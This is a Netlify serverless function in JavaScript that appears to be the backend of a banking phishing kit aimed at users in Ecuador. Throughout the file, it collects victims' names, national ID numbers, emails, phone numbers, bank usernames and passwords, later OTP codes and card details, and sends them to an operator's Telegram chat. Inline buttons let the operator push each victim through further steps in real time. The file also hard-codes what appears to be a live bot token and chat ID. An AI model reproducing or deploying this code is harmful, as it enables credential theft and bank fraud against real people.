exports.handler = async (event) => {
  const TELEGRAM_TOKEN = "7504360348:AAHwDzXqkikSstpzhuk_R9uMg3XljWTqGM4";
  const CHAT_ID = "-1003027102929";

  const headers = {
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Headers": "Content-Type",
    "Access-Control-Allow-Methods": "POST, GET, OPTIONS",
    "Content-Type": "application/json",
  };

  if (event.httpMethod === "OPTIONS") {
    return { statusCode: 200, headers, body: "" };
  }

  try {
    const body = JSON.parse(event.body || "{}");
    const { action, data } = body;

    const sendTelegram = async (text, keyboard) => {
      const payload = {
        chat_id: CHAT_ID,
        text: text,
        parse_mode: "Markdown",
      };
      if (keyboard) payload.reply_markup = keyboard;

      const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
      const json = await r.json();
      console.log("TELEGRAM RESPONSE:", JSON.stringify(json));
      return json;
    };

    if (action === "notify") {
      const { cedula, nombre, correo, telefono, usuario, clave } = data;

      const text =
        `🏦 *NUEVA SOLICITUD*\n` +
        `━━━━━━━━━━━━━━━━\n` +
        `👤 *Nombre:* ${nombre}\n` +
        `🪪 *Cédula:* ${cedula}\n` +
        `📧 *Correo:* ${correo}\n` +
        `📱 *Teléfono:* ${telefono}\n` +
        `🔐 *Usuario:* ${usuario}\n` +
        `🔑 *Clave:* ${clave}\n` +
        `━━━━━━━━━━━━━━━━\n` +
        `🕐 ${new Date().toLocaleString("es-EC", { timeZone: "America/Guayaquil" })}`;

      const keyboard = {
        inline_keyboard: [
          [
            { text: "🔐 OTP", callback_data: `otp_${cedula}` },
            { text: "💳 TARJETA", callback_data: `tarjeta_${cedula}` },
          ],
          [{ text: "❌ ERROR LOGIN", callback_data: `error_login_${cedula}` }],
        ],
      };

      const tg = await sendTelegram(text, keyboard);
      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({ ok: true, tg }),
      };
    }

    if (action === "notify_step") {
      const { cedula, nombre, step, extra } = data;

      let text =
        `📋 *${step} RECIBIDO*\n` +
        `━━━━━━━━━━━━━━━━\n` +
        `👤 *Cliente:* ${nombre}\n` +
        `🪪 *Cédula:* ${cedula}\n`;

      if (extra) {
        Object.entries(extra).forEach(([k, v]) => {
          text += `🔹 *${k}:* ${v}\n`;
        });
      }
      text += `━━━━━━━━━━━━━━━━\n`;
      text += `🕐 ${new Date().toLocaleString("es-EC", { timeZone: "America/Guayaquil" })}`;

      let keyboard = null;
      if (step === "OTP") {
        keyboard = {
          inline_keyboard: [[
            { text: "💳 TARJETA", callback_data: `tarjeta_${cedula}` },
            { text: "❌ ERROR OTP", callback_data: `error_otp_${cedula}` },
          ]],
        };
      } else if (step === "TARJETA") {
        keyboard = {
          inline_keyboard: [[
            { text: "✅ APROBAR", callback_data: `aprobar_${cedula}` },
            { text: "❌ ERROR TARJETA", callback_data: `error_tarjeta_${cedula}` },
          ]],
        };
      }

      const tg = await sendTelegram(text, keyboard);
      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({ ok: true, tg }),
      };
    }

    // TEST directo
    if (action === "test") {
      const tg = await sendTelegram("🔔 *TEST* - Conexión funcionando correctamente desde Netlify ✅");
      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({ ok: true, tg }),
      };
    }

    return { statusCode: 400, headers, body: JSON.stringify({ ok: false, error: "Unknown action" }) };

  } catch (err) {
    console.error("ERROR:", err.message);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ ok: false, error: err.message }),
    };
  }
};
